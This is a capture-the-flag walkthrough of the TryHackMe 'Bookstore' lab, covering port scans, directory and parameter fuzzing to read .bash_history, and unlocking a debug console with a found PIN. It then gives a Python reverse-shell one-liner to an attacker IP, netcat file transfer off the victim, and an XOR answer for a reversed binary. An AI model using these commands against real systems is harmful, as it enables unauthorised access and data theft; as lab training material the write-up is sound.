# Bookstore

**Room Link:** [https://tryhackme.com/room/bookstoreoc](https://tryhackme.com/room/bookstoreoc)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (732).png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (733).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (738).png" alt=""><figcaption></figcaption></figure>





## TCP/5000 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:5000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (739).png" alt=""><figcaption></figcaption></figure>



console is locked by a pin, we will have to come back to it.

<figure><img src="../../.gitbook/assets/image (740).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (734).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (736).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wfuzz -c -f bookstore.txt -u "http://10.10.237.140:5000/api/v1/resources/books?FUZZ=.bash_history" -w /usr/share/wordlists/SecLis
ts/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404
```



## Initial Shell

We bow have the pin for console 123-321-135

<figure><img src="../../.gitbook/assets/image (737).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (741).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1337
```

**Console**

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.43.15",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

<figure><img src="../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>



Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```





## Privilege Escalation



<figure><img src="../../.gitbook/assets/image (744).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (743).png" alt=""><figcaption></figcaption></figure>

### Netcat

**Kali(receiving)**

```
nc -l -p 1234 > try-harder
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < try-harder
```

### Ghidra

We find how the magic number is made.

**Kali**

```
ghidra
```



<figure><img src="../../.gitbook/assets/image (745).png" alt=""><figcaption></figcaption></figure>

We can just quickly use python to solve the answer

**Kali**

```
python
1573724660 ^ 0x5db3 ^ 0x1116
```

<figure><img src="../../.gitbook/assets/image (747).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
./try-harder 
Answer: 1573743953
```

<figure><img src="../../.gitbook/assets/image (746).png" alt=""><figcaption></figcaption></figure>



